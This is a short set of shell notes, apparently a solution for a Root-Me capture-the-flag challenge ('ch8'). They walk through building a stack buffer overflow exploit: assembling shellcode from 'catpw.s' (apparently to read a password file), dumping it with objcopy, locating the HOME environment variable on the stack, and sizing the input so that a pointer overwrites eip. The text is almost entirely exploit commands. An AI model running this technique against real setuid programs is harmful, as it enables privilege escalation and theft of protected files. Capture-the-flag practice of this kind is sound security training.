# instructions for generating exploit data

# shellcode assembly is in catpw.s!

# first generate shellcode binary:
#  compile exploit
nasm -f elf -o out.o catpw.s
# dump shellcode
objcopy --output-target=binary --only-section=.text out.o shell.bin

# figure out where HOME env var will be using C program
# using env -i to work in a clean environment!
# compile program
gcc -m32 -o env enc.c
# get location
env -i HOME=$(python gen_data.py) USERNAME= SHELL= PATH= ./env HOME ./ch8
# (you would need to do this in /tmp or /var/tmp on the rootme server)
# gen_data.py is not needed, we just need the HOME var to be the right size (128 * 4 + 32 + 8 bytes)
# 128 * 4 = env struct
# 32 = other stack data
# 8 = two pointers (first will become eip!)

# modify the gen_data script with the address!

# generate data with python
python3 gen_data.py > data

# then run the program with data as the HOME env variable
# eg:
env -i HOME=$(python gen_data.py) USERNAME= SHELL= PATH= ./ch8